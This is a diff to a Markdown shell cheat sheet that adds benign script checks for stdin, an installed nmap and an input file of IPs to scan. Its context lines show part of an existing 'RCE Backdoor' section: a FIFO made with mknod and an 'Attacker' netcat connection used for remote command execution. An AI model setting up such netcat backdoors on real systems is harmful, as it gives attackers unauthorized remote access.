@@ -36,6 +36,7 @@ Any text after a # in an example is a remark or comment, which explains what the
 - [TUI](#tui)
 - [Advanced](#advanced)
     - [RCE Backdoor](#rce-backdoor)
+    - [Script snippets](#script-snippets)
 - [Resources](#resources)
 
 <!-- /TOC -->
@@ -360,6 +361,20 @@ mknod backpipe p  # Create block or character device special files, -p FIFO
 # Attacker
 nc {hostname/ip} {port e.g. 2222}  # Connect to remote port for RCE
 {commands}
+```
+
+## Script snippets
+Checks for prerequisite input and applications
+```sh
+# Check for stdin input
+read -t 0 -N 0 >/dev/null || echo "Stdin is null. Exiting." >&2
+
+# Check for prerequisite 'nmap'
+command -v nmap >/dev/null 2>&1 || echo "Error: The application 'nmap' is not installed." >&2
+
+# Check for input file
+[ ! -f input.file ] && echo "Error: The file 'input.file' does not exist. Create the file with a list of IPs to scan, separated by carriage return." >&2 && exit 1
+
 ```
 
 # Resources
